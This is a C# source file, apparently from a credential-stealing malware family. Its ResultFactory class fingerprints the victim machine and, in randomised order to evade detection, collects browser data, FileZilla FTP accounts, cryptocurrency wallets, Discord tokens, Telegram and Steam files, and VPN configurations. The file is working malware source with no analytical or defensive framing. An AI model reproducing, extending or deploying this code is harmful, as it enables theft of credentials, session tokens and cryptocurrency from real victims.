using System;
using System.Collections.Generic;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.CSharp.RuntimeBinder;

public static class ResultFactory {

    static ResultFactory()

    {
        Random rnd = new Random();
        ResultFactory.Actions = (from x in ResultFactory.Actions
                                 orderby rnd.Next()
                                 select x).ToArray<ResultFactory.ParsingStep>();
    }
    public static bool Init(ScanningArgs settings, ref ScanResult result)
    {
        bool result2;
        try
        {
            result.ScanDetails = new ScanDetails
            {
                AvailableLanguages = new List<string>(),
                Browsers = new List<ScannedBrowser>(),
                FtpConnections = new List<Account>(),
                GameChatFiles = new List<ScannedFile>(),
                GameLauncherFiles = new List<ScannedFile>(),
                InstalledBrowsers = new List<BrowserVersion>(),
                MessageClientFiles = new List<ScannedFile>(),
                NordAccounts = new List<Account>(),
                Open = new List<ScannedFile>(),
                Processes = new List<string>(),
                Proton = new List<ScannedFile>(),
                ScannedFiles = new List<ScannedFile>(),
                ScannedWallets = new List<ScannedFile>(),
                SecurityUtils = new List<string>(),
                Softwares = new List<string>(),
                SystemHardwares = new List<SystemHardware>()
            };
            ResultFactory.Geolocation(settings, ref result);
            foreach (ResultFactory.ParsingStep parsingStep in ResultFactory.Actions)
            {
                try
                {
                    parsingStep(settings, ref result);
                }
                catch
                {
                }
            }
            result2 = true;
        }
        catch
        {
            result2 = false;
        }
        return result2;
    }
    public static void Geolocation(ScanningArgs settings, ref ScanResult result)
    {
        GeoInfo geoInfo = GeoHelper.Get();
        geoInfo.IP = (string.IsNullOrWhiteSpace(geoInfo.IP) ? "UNKNOWN" : geoInfo.IP);
        geoInfo.Location = (string.IsNullOrWhiteSpace(geoInfo.Location) ? "UNKNOWN" : geoInfo.Location);
        geoInfo.Country = (string.IsNullOrWhiteSpace(geoInfo.Country) ? "UNKNOWN" : geoInfo.Country);
        geoInfo.PostalCode = (string.IsNullOrWhiteSpace(geoInfo.PostalCode) ? "UNKNOWN" : geoInfo.PostalCode);
        result.IPv4 = geoInfo.IP;
        result.City = geoInfo.Location;
        result.Country = geoInfo.Country;
        result.ZipCode = geoInfo.PostalCode;
    }

    public static void LogName(ScanningArgs settings, ref ScanResult result)
    {
        result.Hardware = CryptoHelper.GetMd5Hash(Environment.UserDomainName + Environment.UserName + SystemInfoHelper.GetSerialNumber()).Replace("-", string.Empty);

    }

    public static void GetFileLocation(ScanningArgs settings, ref ScanResult result)
    {
        result.FileLocation = Assembly.GetExecutingAssembly().Location;
    }

    public static void Resolution(ScanningArgs settings, ref ScanResult result)
    {
        result.Resolution = MonitorHelper.MonitorSize();
    }
    public static void MachineName(ScanningArgs settings, ref ScanResult result)
    {
        result.MachineName = Environment.UserName;
    }

    public static void GetProcessors(ScanningArgs settings, ref ScanResult result)
    {
        foreach (SystemHardware item in SystemInfoHelper.GetProcessors())
        {
            result.ScanDetails.SystemHardwares.Add(item);
        }
    }
    public static void GetVideoCards(ScanningArgs settings, ref ScanResult result)
    {
        foreach (SystemHardware item in SystemInfoHelper.GetGraphicCards())
        {
            result.ScanDetails.SystemHardwares.Add(item);
        }
    }
    public static void InstalledBrowsers(ScanningArgs settings, ref ScanResult result)
    {
        result.ScanDetails.InstalledBrowsers = SystemInfoHelper.GetBrowsers();
    }
    

    public static void ListOfPrograms(ScanningArgs settings, ref ScanResult result)
    {
        result.ScanDetails.Softwares = SystemInfoHelper.ListOfPrograms();
    }
    public static void GetAntiviruses(ScanningArgs settings, ref ScanResult result)
    {
        result.ScanDetails.SecurityUtils = SystemInfoHelper.GetFirewalls();
    }
    public static void ListOfProcesses(ScanningArgs settings, ref ScanResult result)
    {
        result.ScanDetails.Processes = SystemInfoHelper.ListOfProcesses();
    }
    public static void Langs(ScanningArgs settings, ref ScanResult result)
    {
        result.ScanDetails.AvailableLanguages = SystemInfoHelper.AvailableLanguages();
    }
    public static void GetTelegram(ScanningArgs settings, ref ScanResult result)
    {
        if (settings.ScanTelegram)
        {
            result.ScanDetails.MessageClientFiles.AddRange(FileScanner.Scan(new FileScannerRule[]
            {
                new DesktopMessangerRule()
            }));
        }
    }
    public static void GetBrowsers(ScanningArgs settings, ref ScanResult result)
    {
        if (settings.ScanBrowsers)
        {
            result.ScanDetails.Browsers.AddRange(Chrome.Scan(settings.ScanChromeBrowsersPaths));
            result.ScanDetails.Browsers.AddRange(Gecko.Scan(settings.ScanGeckoBrowsersPaths));
        }
    }

    public static void GetFTP(ScanningArgs settings, ref ScanResult result)
    {
        if (settings.ScanFTP)
        {
            result.ScanDetails.FtpConnections = FileZilla.Scan();
        }
    }

    public static void GetCryptoWallets(ScanningArgs settings, ref ScanResult result)
    {
        if (settings.ScanWallets)
        {
            result.ScanDetails.ScannedWallets = new List<ScannedFile>();
            BrowserExtensionsRule browserExtensionsRule = new BrowserExtensionsRule();
            browserExtensionsRule.SetPaths(settings.ScanChromeBrowsersPaths);
            result.ScanDetails.ScannedWallets.AddRange(FileScanner.Scan(new FileScannerRule[]
            {
                new ArmoryRule(),
                new AtomicRule(),
                new CoinomiRule(),
                new ElectrumRule(),
                new EthRule(),
                new ExodusRule(),
                new GuardaRule(),
                new Jx(),
                new AllWalletsRule(),
                browserExtensionsRule
            }));
        }
    }
    public static void GetDiscord(ScanningArgs settings, ref ScanResult result)
    {
        if (settings.ScanDiscord)
        {
            ScanDetails scanDetails = result.ScanDetails;
            IEnumerable<ScannedFile> tokens = DiscordRule.GetTokens();
            scanDetails.GameChatFiles = ((tokens != null) ? tokens.ToList<ScannedFile>() : null);
        }
    }
    public static void GetSteam(ScanningArgs settings, ref ScanResult result)
    {
        if (settings.ScanSteam)
        {
            result.ScanDetails.GameLauncherFiles = FileScanner.Scan(new FileScannerRule[]
            {
                new GameLauncherRule()
            });
        }
    }
    public static void GetVPNs(ScanningArgs settings, ref ScanResult result)
    {
        if (settings.ScanVPN)
        {
            result.ScanDetails.NordAccounts = new List<Account>();
            result.ScanDetails.Open = FileScanner.Scan(new FileScannerRule[]
            {
                new OpenVPNRule()
            });
            result.ScanDetails.Proton = FileScanner.Scan(new FileScannerRule[]
            {
                new ProtonVPNRule()
            });
        }
    }
    public static ResultFactory.ParsingStep[] Actions { get; set; } = new ResultFactory.ParsingStep[]
    {
        new ResultFactory.ParsingStep(ResultFactory.LogName),
        new ResultFactory.ParsingStep(ResultFactory.GetFileLocation),
        new ResultFactory.ParsingStep(ResultFactory.Resolution),
        new ResultFactory.ParsingStep(ResultFactory.MachineName),
        new ResultFactory.ParsingStep(ResultFactory.GetProcessors),
        new ResultFactory.ParsingStep(ResultFactory.GetVideoCards),
        new ResultFactory.ParsingStep(ResultFactory.InstalledBrowsers),
        new ResultFactory.ParsingStep(ResultFactory.ListOfPrograms),
        new ResultFactory.ParsingStep(ResultFactory.GetAntiviruses),
        new ResultFactory.ParsingStep(ResultFactory.ListOfProcesses),
        new ResultFactory.ParsingStep(ResultFactory.Langs),
        new ResultFactory.ParsingStep(ResultFactory.GetTelegram),
        new ResultFactory.ParsingStep(ResultFactory.GetBrowsers),
        new ResultFactory.ParsingStep(ResultFactory.GetFTP),
        new ResultFactory.ParsingStep(ResultFactory.GetCryptoWallets),
        new ResultFactory.ParsingStep(ResultFactory.GetDiscord), //outdated 
        new ResultFactory.ParsingStep(ResultFactory.GetSteam),
        new ResultFactory.ParsingStep(ResultFactory.GetVPNs),
    };


    public delegate void ParsingStep(ScanningArgs settings, ref ScanResult result);
}

